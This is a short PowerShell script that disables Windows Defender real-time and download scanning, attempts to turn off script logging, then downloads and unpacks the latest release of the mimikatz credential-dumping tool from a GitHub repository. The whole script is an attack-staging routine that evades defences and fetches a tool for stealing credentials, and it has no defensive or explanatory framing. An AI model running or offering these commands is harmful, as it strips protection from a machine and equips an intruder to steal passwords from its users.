Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -EnableScriptBlockLogging $false

$repo = "ParrotSec/mimikatz" #Install mimikatz
$latest = Invoke-RestMethod "https://api.github.com/repos/$repo/releases/latest"
$asset = $latest.assets | Where-Object { $_.name -like "*.zip" }

Invoke-WebRequest $asset.browser_download_url -OutFile $asset.name
Expand-Archive $asset.name -DestinationPath ".\package"
